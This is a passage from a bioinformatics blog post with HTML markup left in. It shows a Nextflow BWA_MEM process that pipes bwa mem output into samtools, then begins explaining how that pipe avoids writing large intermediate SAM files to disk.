plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> cram</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">   optional</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.csi"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> csi</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">    optional</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    tuple </span><span class="token function" style="color:hsl(221, 87%, 60%)">val</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">meta</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"*.crai"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> crai</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">   optional</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    path  </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"versions.yml"</span><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> emit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> versions</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token spock-block">when:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">when</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> args2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">args2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> samtools_command </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'sort'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'view'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--output-fmt sam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"sam"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--output-fmt cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"-O cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"-C"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"bam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> reference </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> fasta </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> extension</span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--reference </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">fasta</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">fasta </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> extension</span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> error </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"Fasta reference is required for CRAM output"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    INDEX=`find -L ./ -name "*.amb" | sed 's/\\.amb\$//'`</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    bwa mem \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">args</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        -t </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.cpus \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        \$INDEX \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">reads</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> \\</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        | samtools </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">samtools_command</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">args2</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">reference</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> --threads </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">$</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.cpus -o </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"> -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        bwa: \$(echo \$(bwa 2&gt;&amp;1) | sed 's/^.*Version: //; s/Contact:.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        samtools: \$(echo \$(samtools --version 2&gt;&amp;1) | sed 's/^.*samtools //; s/Using.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    stub</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> args2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">args2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> task</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ext</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">prefix </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">meta</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">id</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> extension </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--output-fmt sam"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"sam"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"--output-fmt cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"-O cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">sort_bam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> args2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"-C"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">?</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"cram"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"bam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">extension</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.csi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    touch </span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">prefix</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">.crai</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="display:inline-block;color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    cat &lt;&lt;-END_VERSIONS &gt; versions.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    "</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">${</span><span class="token interpolation-string interpolation expression">task</span><span class="token interpolation-string interpolation expression punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token interpolation-string interpolation expression">process</span><span class="token interpolation-string interpolation interpolation-punctuation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">":</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        bwa: \$(echo \$(bwa 2&gt;&amp;1) | sed 's/^.*Version: //; s/Contact:.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">        samtools: \$(echo \$(samtools --version 2&gt;&amp;1) | sed 's/^.*samtools //; s/Using.*\$//')</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    END_VERSIONS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-the-pipe-in-bwa_mem">Understanding the Pipe in BWA_MEM<a href="https://riverxdata.github.io/river-docs/blog/unix-pipes-bioinformatics-streaming-data#understanding-the-pipe-in-bwa_mem" class="hash-link" aria-label="Direct link to Understanding the Pipe in BWA_MEM" title="Direct link to Understanding the Pipe in BWA_MEM" translate="no">​</a></h3>
<p>The key line in this process is the pipe connecting bwa and samtools:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$args</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$task</span><span class="token plain">.cpus </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$INDEX</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$reads</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> samtools </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$samtools_command</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$args2</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${reference}</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--threads</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$task</span><span class="token plain">.cpus </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${prefix}</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${extension}</span><span class="token plain"> -</span><br></span></code></pre></div></div>
<p><strong>Here's what happens:</strong></p>
<ol>
<li class="">
<p><strong>bwa mem</strong> aligns reads to reference genome</p>
<ul>
<li class="">Outputs SAM format to stdout</li>
<li class="">This is hundreds of GB for large genomes</li>
<li class=""><strong>Without the pipe,</strong> this would be written to disk as an intermediate <code>.sam</code> file</li>
</ul>
</li>
<li class="">
